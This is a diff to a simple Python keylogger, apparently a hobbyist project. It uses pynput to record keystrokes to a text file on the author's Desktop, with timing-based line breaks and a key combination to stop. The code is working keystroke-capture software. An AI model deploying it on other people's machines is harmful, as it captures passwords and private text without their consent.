@@ -1,5 +1,5 @@
-
 from pynput import keyboard
+import time
 
 # creating a new file named keys
 keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
@@ -12,20 +12,32 @@ current = set()
 
 keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")
 
+i_time = time.time()  # initial time on the starting of the programme
+
 
 def on_press(key):
-
+    global keys  # to prevent unbound local error
+    global i_time
+    # if(time.time() - i_time <= 2):
+    print(time.time() - i_time)
     if key in close_combination:
         current.add(key)
         if all(k in current for k in close_combination):
 
-            global keys  # to prevent unbound local error< I hope it is working now!
             keys.close()
             listener.stop()
+
     else:
+        if(time.time() - i_time <= 2):
+            pass
+        else:
+            keys.write("\n")
 
         if key == keyboard.Key.space:
             keys.write(" ")
+
+        elif key == keyboard.Key.enter:
+            keys.write("\n")
 
         elif key == keyboard.Key.backspace:
             keys.close()
@@ -38,7 +50,10 @@ def on_press(key):
             try:
                 keys.write(key.char)
             except AttributeError:
-                keys.write(format(key))
+                # keys.write(format(key))
+                pass  # keys like shift, enter, ctrl come in this category
+
+    i_time = time.time()
 
 
 def on_release(key):
@@ -47,12 +62,13 @@ def on_release(key):
     except KeyError:
         pass
     try:
+        # it helps write the keys which are clicked at the same time
         keys.write(key)
     except:
         pass
 
 
-# Collect events until released<
+# Collect events until released
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
@@ -64,3 +80,5 @@ listener = keyboard.Listener(
     on_press=on_press,
     on_release=on_release)
 listener.start()
+
+# does it work fine next line
